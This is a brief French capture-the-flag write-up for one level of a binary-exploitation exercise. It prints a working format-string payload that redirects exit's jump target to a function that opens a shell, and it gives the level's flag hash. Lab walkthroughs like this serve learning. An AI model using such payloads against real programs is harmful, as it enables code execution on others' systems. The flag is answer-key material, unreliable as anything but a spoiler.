## GET Flag

L'exploit effectue pour ce niveau est semblable au precedent. Cependant la variable globale a modifier est celle a laquelle exit va jump.
Cette adresse est: `\x38\x98\x04\x08`. Il est possible de la remplacer par l'adresse de la fonction o.
La fonction o va ensuite ouvrir un shell.

`python -c 'print "\x38\x98\x04\x08" + 2*"%12x" + "%134513800x" + "%n"' > exploit`

### Flag

```
level6
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
